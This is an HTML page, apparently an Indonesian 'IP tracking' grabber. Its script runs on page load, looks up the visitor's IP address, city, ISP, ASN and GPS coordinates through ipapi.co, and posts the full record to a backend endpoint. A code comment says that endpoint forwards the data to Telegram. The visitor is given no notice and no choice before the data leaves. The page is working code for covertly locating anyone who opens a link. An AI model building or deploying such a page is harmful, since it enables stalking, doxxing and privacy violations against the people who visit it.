<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Pelacakan IP</title>
</head>
<body>
  <h3 id="status">🔎 Melacak lokasi...</h3>
  <pre id="result"></pre>

  <script>
    async function getAndSendIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const info = `
🌐 Hasil Pelacakan IP

📍 IP: ${data.ip}
🌍 Negara: ${data.country_name}
🏙 Kota: ${data.city}, ${data.region}
🛰 ISP: ${data.org}
🏢 Org: ${data.org}
⚡ ASN: ${data.asn || "N/A"}
⌚ Zona Waktu: ${data.timezone}
📌 Koordinat: ${data.latitude}, ${data.longitude}

🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}
        `.trim();

        document.getElementById("status").textContent = "✅ Data berhasil diambil";
        document.getElementById("result").textContent = info;

        // Kirim data lengkap ke API agar dikirim ke Telegram
        const sendRes = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ data }),
        });

        const sendResult = await sendRes.json();
        if (!sendResult.ok) {
          console.error("Gagal kirim ke Telegram:", sendResult);
          document.getElementById("status").textContent = "❌ Gagal kirim ke Telegram";
        }

      } catch (err) {
        console.error("Error:", err);
        document.getElementById("status").textContent = "❌ Gagal melacak IP";
      }
    }

    getAndSendIP();
  </script>
</body>
</html>
